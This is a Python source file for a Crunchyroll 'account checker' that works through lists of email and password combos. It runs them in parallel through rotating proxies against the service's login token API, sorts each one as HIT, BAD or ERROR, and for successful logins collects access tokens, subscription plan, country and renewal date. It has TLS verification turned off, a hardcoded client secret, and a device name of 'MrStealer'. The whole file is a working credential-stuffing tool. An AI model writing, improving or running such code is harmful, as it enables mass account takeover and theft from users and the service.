#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Crunchyroll Engine - Full Capture via Official API
Supports proxies via ProxyManager
Returns: 'HIT', 'BAD', 'ERROR'
"""

import re
import time
import random
import string
import logging
import threading
import requests
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logger = logging.getLogger(__name__)

DEFAULT_TIMEOUT = 30
MAX_RETRIES = 3
THREAD_POOL_SIZE = 20

CLIENT_ID = "ajcylfwdtjjtq7qpgks3"
CLIENT_SECRET = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"
USER_AGENT = "Crunchyroll/3.84.1 Android/9 okhttp/4.12.0"


class CrunchyrollAccountChecker:
    def __init__(self, proxy_manager=None, timeout: int = DEFAULT_TIMEOUT, debug: bool = False):
        self.proxy_manager = proxy_manager
        self.timeout = timeout
        self.debug = debug

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = False
        retries = Retry(total=MAX_RETRIES, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retries)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({'User-Agent': USER_AGENT})
        if self.proxy_manager:
            proxy = self.proxy_manager.get_next_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session

    def _generate_device_id(self) -> str:
        return ''.join(random.choices('0123456789abcdef', k=16))

    def _get_access_token(self, session: requests.Session, email: str, password: str) -> Optional[Dict]:
        device_id = self._generate_device_id()
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "device_type": "MrStealer",
            "device_id": device_id,
            "device_name": "MrStealer"
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            resp = session.post(url, data=data, headers=headers, timeout=self.timeout)
            if resp.status_code != 200:
                if "invalid_credentials" in resp.text.lower() or "invalid_grant" in resp.text.lower():
                    return {"error": "invalid_credentials"}
                return None
            data = resp.json()
            if "access_token" not in data:
                return None
            return {
                "access_token": data["access_token"],
                "account_id": data.get("account_id", "N/A"),
                "refresh_token": data.get("refresh_token")
            }
        except Exception as e:
            logger.error(f"Token error: {e}")
            return None

    def _get_account_info(self, session: requests.Session, access_token: str) -> Dict:
        url = "https://beta-api.crunchyroll.com/accounts/v1/me"
        headers = {"Authorization": f"Bearer {access_token}"}
        try:
            resp = session.get(url, headers=headers, timeout=self.timeout)
            if resp.status_code == 200:
                data = resp.json()
                return {"external_id": data.get("external_id", "N/A"), "email": data.get("email", "N/A")}
            return {}
        except Exception as e:
            logger.error(f"Account info error: {e}")
            return {}

    def _get_subscription_info(self, session: requests.Session, access_token: str, external_id: str) -> Dict:
        url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"
        headers = {"Authorization": f"Bearer {access_token}"}
        try:
            resp = session.get(url, headers=headers, timeout=self.timeout)
            if resp.status_code != 200:
                return {}
            text = resp.text
            country_match = re.search(r'"subscription_country":"(.*?)"', text)
            country = country_match.group(1) if country_match else "N/A"
            benefits = re.findall(r'"benefit":"(.*?)"', text)
            streams = [b for b in benefits if b.startswith("concurrent_")]
            cr_store = "cr_store" in benefits
            cr_premium = "cr_premium" in benefits
            plan_parts = []
            if streams:
                stream_count = streams[0].split(".")[1]
                plan_map = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}
                plan_parts.append(plan_map.get(stream_count, streams[0]))
            if cr_store:
                plan_parts.append("CR STORE")
            if cr_premium:
                plan_parts.append("CR PREMIUM")
            plan = " | ".join(plan_parts) if plan_parts else "FREE"
            expiry_match = re.search(r'"next_renewal_date":"(.*?)T', text)
            expiry = expiry_match.group(1) if expiry_match else "N/A"
            days_left = "N/A"
            if expiry != "N/A":
                try:
                    expiry_date = datetime.strptime(expiry, "%Y-%m-%d")
                    days_left = (expiry_date - datetime.now()).days
                except:
                    pass
            return {"country": country, "plan": plan, "expiry": expiry, "days_left": days_left}
        except Exception as e:
            logger.error(f"Subscription info error: {e}")
            return {}

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        session = self._create_session()
        result = {'status': 'ERROR', 'email': email, 'password': password, 'message': ''}
        try:
            token_data = self._get_access_token(session, email, password)
            if not token_data:
                result['status'] = 'BAD'
                result['message'] = 'Invalid credentials or API error'
                return result
            if token_data.get("error") == "invalid_credentials":
                result['status'] = 'BAD'
                result['message'] = 'Invalid credentials'
                return result

            access_token = token_data["access_token"]
            account_id = token_data.get("account_id", "N/A")
            account_info = self._get_account_info(session, access_token)
            external_id = account_info.get("external_id", "N/A")
            sub_info = self._get_subscription_info(session, access_token, external_id)

            result['status'] = 'HIT'
            result['message'] = 'Success'
            result['access_token'] = access_token
            result['account_id'] = account_id
            result['external_id'] = external_id
            result['country'] = sub_info.get('country', 'N/A')
            result['plan'] = sub_info.get('plan', 'FREE')
            result['expiry'] = sub_info.get('expiry', 'N/A')
            result['days_left'] = sub_info.get('days_left', 'N/A')
            return result
        except Exception as e:
            result['status'] = 'ERROR'
            result['message'] = str(e)
            logger.error(f"Check error for {email}: {e}")
            return result
        finally:
            session.close()

    def check_batch(self, combos: List[Tuple[str, str]], max_workers: int = THREAD_POOL_SIZE, progress_callback=None) -> List[Dict]:
        results = []
        results_lock = threading.Lock()
        total = len(combos)
        checked = 0

        def worker(combo):
            nonlocal checked
            email, pwd = combo
            res = self.check_account(email, pwd)
            with results_lock:
                results.append(res)
                checked += 1
                if progress_callback:
                    progress_callback(checked, total)
            return res

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(worker, combo) for combo in combos]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Batch worker error: {e}")
        return results